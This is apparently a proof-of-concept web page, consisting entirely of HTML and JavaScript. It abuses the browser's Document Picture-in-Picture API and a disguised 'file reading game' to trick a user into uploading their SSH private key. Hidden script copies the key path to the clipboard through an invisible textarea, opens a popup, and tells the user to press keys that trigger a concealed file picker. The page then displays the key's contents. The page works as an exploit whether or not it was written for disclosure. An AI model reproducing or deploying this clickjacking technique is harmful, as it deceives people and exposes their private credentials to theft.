<button onclick="start()">Click here</button>
<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">

<pre id="contents"></pre>

<script>
const fileReadPath = "%userprofile%\\.ssh\\id_rsa";

async function loadFile(file) {
  window.moveTo(0, 0);
  window.resizeTo(500, 500);
  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
}

const pipOpen = async () => {
  pipWindow = await documentPictureInPicture.requestWindow({
    width: Math.pow(2,32),
    height: Math.pow(2,32),
  });
  pipWindow.document.body.innerHTML = `
  <button onclick="eval(document.querySelector('script').innerText)">Start file reading game!</button>
  <script>
  copyToClipboard("${fileReadPath}");
  const popup = window.open("${document.location.href}", "popup-read", "popup");
  popup.resizeTo(200,200);
  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);

  setTimeout(()=>
    document.body.innerHTML = "<p>Press enter, then ctrl+v and enter to win this game!</p>",
    400
  );

  function copyToClipboard(text) {
    const textarea = document.createElement("textarea");
    textarea.style.opacity = "0%";
    textarea.textContent = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
  }

  <${'/'}script>
  `;
};

function start() {
  pipOpen();
}

if (window.name == "popup-read") {
  document.body.onkeydown = () => document.getElementById("upload").click();
}
</script>
